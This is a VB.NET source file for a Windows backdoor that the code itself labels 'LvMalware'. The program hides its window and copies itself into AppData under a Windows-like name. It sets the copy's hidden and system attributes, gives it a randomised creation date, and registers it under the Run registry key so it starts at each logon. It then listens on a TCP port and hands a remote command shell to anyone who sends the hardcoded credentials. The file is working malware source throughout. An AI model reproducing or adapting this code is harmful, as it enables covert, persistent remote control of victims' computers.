Imports System.Net.Sockets
Imports System.IO
Imports System.Threading
Imports System.Diagnostics
Imports Microsoft.Win32
Public Class Form1
    Dim Server As New TcpListener(6513)
    Dim cliente As TcpClient
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Install()
        Dim t As New Thread(AddressOf ListeN)
        t.Start()
    End Sub
    Delegate Sub _Client_Thread(ByVal cl As TcpClient)
    Sub Client_Thread(ByVal Cl As TcpClient)
        On Error Resume Next
        Dim reader As StreamReader
        Dim Writer As New StreamWriter(Cl.GetStream)
        reader = New StreamReader(Cl.GetStream)
        If reader.ReadLine = "System Login" Then
        Else
            Cl.Close()
            Exit Sub
        End If
        Writer.Write("Login: ")
        Writer.Flush()
        Dim username = reader.ReadLine()
        Writer.Write("Password: ")
        Writer.Flush()
        Dim password = reader.ReadLine
        If username = "LvMalware" AndAlso password = "password" Then
            Writer.WriteLine("")
            Writer.Flush()
            Writer.WriteLine("Welcome master LvMalware!!!")
            Writer.WriteLine("Here's the shell: ")
            Writer.Flush()
            Writer.WriteLine("")
            Writer.Flush()
            Writer.WriteLine("")
            Writer.Flush()

        Else
            Cl.Close()
            Exit Sub
        End If
        Dim wShell As New Shell(Cl)
        wShell.Start()
        While Cl.Connected
            reader = New StreamReader(Cl.GetStream)
            Dim cmd = reader.ReadLine
            wShell.ExecuteCommand(cmd)
        End While
        wShell.Stop()
        Exit Sub
    End Sub
    Sub ListeN()
        On Error Resume Next
        Server.Start()
        While True
            cliente = New TcpClient
            cliente = Server.AcceptTcpClient
            Dim ct As New _Client_Thread(AddressOf Client_Thread)
            ct.BeginInvoke(cliente, Nothing, Nothing)
        End While
    End Sub
    Sub Install()
        On Error Resume Next
        Dim mName = Environment.ExpandEnvironmentVariables("%AppData%") & "\mswin32.dll.exe"
        FileCopy(Application.ExecutablePath, mName)
        File.SetAttributes(mName, 2 + 4)
        File.SetCreationTime(mName, RandomDate)
        Dim Key As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
        Key.SetValue("mswin32", mName)
        Key.Close()
    End Sub
    Function RandomDate() As Date
        Dim DtaFormat = "dd/mm/201a h:m:s"
        Dim returnDate As String = ""
        Dim n
        Randomize()
        n = Int(Rnd() * 28) + 1
        returnDate = DtaFormat.Replace("dd", n)
        n = Int(Rnd() * 12) + 1
        returnDate = returnDate.Replace("mm", n)
        n = Int(Rnd() * 6) + 1
        returnDate = returnDate.Replace("a", n)
        n = Int(Rnd() * 12) + 1
        returnDate = returnDate.Replace("h", n)
        n = Int(Rnd() * 58) + 1
        returnDate = returnDate.Replace("m", n)
        n = Int(Rnd() * 58) + 1
        returnDate = returnDate.Replace("s", n)
        Return Date.Parse(returnDate)
    End Function
End Class
